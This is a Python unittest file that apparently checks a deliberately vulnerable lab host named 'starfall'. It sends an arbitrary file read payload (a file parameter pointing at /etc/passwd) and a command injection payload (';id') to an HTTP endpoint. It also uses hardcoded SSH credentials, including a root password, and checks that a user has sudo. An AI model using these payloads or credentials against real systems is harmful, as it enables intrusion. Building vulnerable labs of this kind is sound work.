import unittest
from libraries.http_tests import check_http_payload_200
from libraries.ssh_tests import test_ssh_login
from libraries.cmd_tests import test_cmd_execution_over_ssh

class TestStarfall(unittest.TestCase):
    starfall_target_ip = "10.100.7.43"

    def test_0_starfall_arbitrary_file_read(self): # arbitrary file read
        result = check_http_payload_200(
            target_ip=self.starfall_target_ip,
            url_path="/api/health/history?file=/etc/passwd",
            port=5000,
        )
        self.assertTrue(result.success, msg=result.message)
        self.assertIn("root:", result.data or "", msg="Arbitrary file read failed")

    # starfall command injection
    def test_0_starfall_command_injection(self): # command injection
        result = check_http_payload_200(
            target_ip=self.starfall_target_ip,
            url_path="/api/health/history?file=health_history.csv;id",
            port=5000,
        )
        self.assertTrue(result.success, msg=result.message)
        self.assertIn("uid=", result.data or "", msg="Command injection failed")

    def test_1_starfall_ssh_login(self): # ssh login
        result = test_ssh_login(
            target_ip=self.starfall_target_ip,
            username="starfall",
            password="starfall",
            port=22,
        )
        self.assertTrue(result.success, msg=result.message)

    # check if starfall user is part of the sudo group
    def test_2_starfall_sudo_group(self):
        result = test_cmd_execution_over_ssh(
            target_ip=self.starfall_target_ip,
            username="root",
            password="qi6AJZin",
            command="groups starfall",
            expected_output="sudo"
        )
        # print(result)
        self.assertTrue(result.success, msg=result.message)
                        
if __name__ == "__main__":
    unittest.main()